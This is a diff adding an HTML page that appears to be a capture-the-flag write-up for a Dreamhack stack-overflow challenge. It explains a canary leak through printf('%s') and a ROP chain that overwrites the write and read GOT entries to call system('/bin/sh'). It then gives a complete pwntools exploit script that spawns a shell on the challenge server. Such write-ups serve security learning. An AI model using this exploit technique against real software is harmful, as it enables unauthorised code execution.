@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>milkbomb11</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+
+    <header>
+        <h1>milkbomb11</h1>
+        <a href="/index.html">[to index]</a>
+    </header>
+
+    <main>
+        <p>The problem can be seen <a href="https://dreamhack.io/wargame/challenges/354">here</a>.<br/>
+            The source code of the target program is as below.
+
+        </p>
+
+        <pre><code>
+// Name: rop.c
+// Compile: gcc -o rop rop.c -fno-PIE -no-pie
+
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+int main() {
+  char buf[0x30];
+
+  setvbuf(stdin, 0, _IONBF, 0);
+  setvbuf(stdout, 0, _IONBF, 0);
+
+  // Leak canary
+  puts("[1] Leak Canary");
+  write(1, "Buf: ", 5);
+  read(0, buf, 0x100);
+  printf("Buf: %s\n", buf);
+
+  // Do ROP
+  puts("[2] Input ROP payload");
+  write(1, "Buf: ", 5);
+  read(0, buf, 0x100);
+
+  return 0;
+}
+
+        </code></pre>
+
+        <p> This problem can be split into the following two phases</p>
+<p>[1] canary leakage</p>
+<p>[2] ROP</p>
+<p>
+The stack looks like below, where each cell is 8 bytes except for that of buf which is 48 bytes and the more left you go, the lower the address is.<br>
+
+<p>|buf|UNUSED|canary|%rbp|ret addr|</p>
+
+<p>
+To leak the canary, we exploit the fact that <code>printf("%s")</code> prints all bytes until it reaches a null terminator. We fill out buf and the unused region with b'A's by sending 57 b'A's. 
+You may notice that we send 57 'A's instead of 56, corrupting the first byte of canary to 'A'. 
+This is because the first byte of the canary cell, i.e. the byte right after the UNUSED cell, is always 0x0, which stops <code>printf("%s")</code> 
+from printing the rest of the canary bytes. So we intentionally set the first byte of the canary cell to 'A' to sort of temporarily bridge the 
+gap between the rest of the canary bytes and the unused cell. <code>printf("%s")</code> now prints out 56 'A's, the canary with its first byte corrupted to 'A', 
+and other values beyond the canary. We can then reconstruct the canary from the result of printf by splicing [57:64] from it and concatenating it with <code>b'\x00'</code>,
+essentially restoring the canary.
+
+The next phase is to send an ROP chain which calls these four functions consecutively.</p>
+
+<p>write(1, &write_got_entry, 0x100) </p>
+<p>read(0, &write_got_entry, 0x100)</p>
+<p>read(0, &read_got_entry, 0x100)</p>
+<p>system("/bin/sh")</p>
+
+<p> The whole ROP payload is as follows </p>
+<p>
+&lt;-- lower address<br>
+|'A'*56|canary|'A'*8|rdi_gadget|0x1|rsi_gadget|write_got_addr|0x2|write_plt|rdi_gadget|0x0|rsi_gadget|write_got_addr|0x2|read_plt|rdi_gadget|0x0|rsi_gadget|read_got_addr|0x2|read_plt|rdi_gadget|read_got_addr|ret_gadget|write_plt| higher address --&gt;
+</p>
+<p>
+We fill out the stack starting at the return address of main with <br>
+|rdi_gadget|0x1|rsi_gadget|write_got_addr|0x2|write_plt|...<br>
+This leaks the GOT entry of write which we can then use to calculate the got entry of system . <br>
+We continue to fill out the stack with <br>
+|rdi_gadget|0x0|rsi_gadget|write_got_addr|0x2|read_plt|... <br>
+This calls read, allowing us to fill out the GOT entry of write with that of system we have previously calculated. <br>
+Next to that we fill the stack with <br>
+|rdi_gadget|0x0|rsi_gadget|read_got_addr|0x2|read_plt|... <br>
+which calls read, but this time allowing us to fill out the GOT entry of read with "/bin/sh\x00" . <br>
+We finally fill the stack with <br>
+|rdi_gadget|read_got_addr|ret_gadget|write_plt|. <br>
+Since the GOT entry of read was corrupted to contain "/bin/sh\x00", the address to the string "/bin/sh" will be stored to %rdi. And because the GOT entry of write was 
+corrupted to contain the GOT entry of system, calling write via the PLT will call system. Therefore the program will call <code>system("/bin/sh")</code>. 
+The reason we put a ret_gadget after the rdi_gadget instead of letting the ret instruction in the rdi_gadget return directly to write_plt, 
+is because for <code>system("/bin/sh")</code> to work, right after write_plt is popped, the stack pointer must be a multiple of 16.
+</p>        
+        <p> The exploit code is as below. </p>
+
+        <pre><code>
+#!/usr/bin/python3
+from pwn import *
+
+def exploit():
+    #p = process("./rop")
+    p = remote("host8.dreamhack.games", 17041)
+    #input("")
+    #context.log_level = "debug"
+    libc = ELF("./libc.so.6")
+    system_offset = libc.symbols['system']
+    write_offset = libc.symbols['write']
+    print("Offset of system() within libc library: 0x%x" % system_offset)
+    print("Offset of write() within libc library: 0x%x" % write_offset)
+
+    rop = ROP("./rop")
+
+    print(rop.rdi)
+    print(rop.rsi)
+    print(rop.ret)
+
+    rdi_gadget = 0x400853
+    rsi_gadget = 0x400851
+    ret_gadget = 0x400596
+    write_plt = 0x4005c0
+    write_got_addr = 0x601020
+    read_plt = 0x4005f0
+    read_got_addr = 0x601038
+
+    p.sendafter(b"Buf: ", b"A"*57)
+    canary = b"\x00" + p.recvline().rstrip().split(b": ")[1][57:64]
+    print(canary, canary.__len__())
+
+    p.sendafter(b"Buf: ", b"A"*56 + canary + b"A"*8 + 
+                p64(rdi_gadget) + p64(0x1) + p64(rsi_gadget) + p64(write_got_addr) + p64(0x2) + p64(write_plt) +
+                p64(rdi_gadget) + p64(0x0) + p64(rsi_gadget) + p64(write_got_addr) + p64(0x2) + p64(read_plt) +
+                p64(rdi_gadget) + p64(0x0) + p64(rsi_gadget) + p64(read_got_addr) + p64(0x2) + p64(read_plt) +
+                p64(rdi_gadget) + p64(read_got_addr) + p64(ret_gadget) + p64(write_plt))
+    
+    write_got_entry = u64(p.recv(0x100)[0:8])
+    system_got_entry = write_got_entry - write_offset + system_offset
+    print("{:x}".format(system_got_entry))
+    
+
+    sleep(0.1)
+    p.send(p64(system_got_entry))
+    sleep(0.1)
+    p.send(b"/bin/sh\x00")
+    p.interactive()
+
+
+if __name__ == "__main__": exploit()
+        </code></pre>
+
+    </main>
+</body>
+</html>
